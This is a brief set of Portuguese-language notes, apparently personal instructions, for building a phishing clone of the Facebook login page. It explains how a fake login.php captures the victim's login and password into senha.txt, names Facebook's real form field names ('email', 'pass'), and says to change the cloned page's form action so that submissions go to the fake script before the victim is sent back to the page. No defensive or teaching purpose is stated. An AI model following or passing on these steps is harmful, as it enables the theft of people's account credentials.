O arquivo login.php é responsavel por receber os campos "login" e "senha" da pagina fake e armazenar no arquivo senha.txt
	-É necesario coletar o nome do campo da aplicação, para definir no login.php
	-No exemplo, a vitima ira dar submit no campo, fornecendo login e senha, e sera encaminhada para a pagina nvamente

-Identificar no formulario da pagina original os campos login e senha e action da pagina login.php original
	-No caso do facebook o input do login é chamado: email
	-No caso do facebook o input da senha é chamado: pass

-Adicionar na pagina fake login.php as informações de login e senha, nos campos caixa1 e 2
-Alterar na pagina index.html o campo action, informando o fake login.php ao invez do:
	login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjA2NTkyMTI3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D
